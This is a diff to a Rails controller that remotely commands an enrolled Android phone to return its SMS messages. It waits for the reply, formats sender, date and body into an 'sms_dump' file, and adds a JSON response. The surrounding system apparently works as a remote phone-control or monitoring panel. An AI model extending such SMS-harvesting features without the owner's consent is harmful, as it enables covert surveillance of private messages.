@@ -8,30 +8,39 @@ class SmsMessagesController < InheritedResources::Base
       smartphone_id = params[:smartphone_id]
       @smartphone = Smartphone.find(smartphone_id)
       
-      # Send command via ActionCable to Android app
-      command_data = {
-        command: "get_sms",
-        timestamp: Time.now.to_i
-      }
+      # Use send_command_and_wait to get data back
+      pending_command = send_command_and_wait(@smartphone, 'get_sms', {}, timeout: 30.seconds)
       
-      ActionCable.server.broadcast(
-        "commands_#{@smartphone.device_id}",
-        command_data
-      )
+      if pending_command.completed?
+        data = pending_command.response_data
+        messages = data['messages'] || data['payload']['messages'] || []
+        
+        # Format messages for display
+        formatted_msgs = messages.map do |m|
+          "From: #{m['address']} | Date: #{Time.at(m['date'].to_i/1000).strftime('%Y-%m-%d %H:%M')} | #{m['body']}"
+        end
+        
+        commandOutput = ["Fetched #{messages.size} messages:"] + formatted_msgs.first(50) # Limit to 50
+      else
+         commandOutput = ["Operation Failed: Device did not respond (Timeout)"]
+      end
       
-      commandOutput = ["Command sent to device #{@smartphone.device_id}", "SMS dump requested..."]
       @fileName = "sms_dump_#{Time.now.to_i}.txt"
     rescue => e
       Rails.logger.error("Error on dump messages: #{e.message}")
       commandOutput = ["Operation Failed: #{e.message}"]
       @fileName = "error.txt"
     end
-    respond_to do |format|
-      format.js {
-        render "dump_messages",
-               :locals => { :commandOutput => commandOutput,
-                            :fileName => @fileName }
-      }
+    if want_json?
+      render json: { output: commandOutput, filename: @fileName }
+    else
+      respond_to do |format|
+        format.js {
+          render "dump_messages",
+                 :locals => { :commandOutput => commandOutput,
+                              :fileName => @fileName }
+        }
+      end
     end
   end
 
@@ -61,6 +70,10 @@ class SmsMessagesController < InheritedResources::Base
   end
 
   private
+
+  def want_json?
+    request.format.json? || request.headers['Accept']&.include?('application/json')
+  end
 
   def sms_message_params
     params.require(:sms_message).permit(:date,
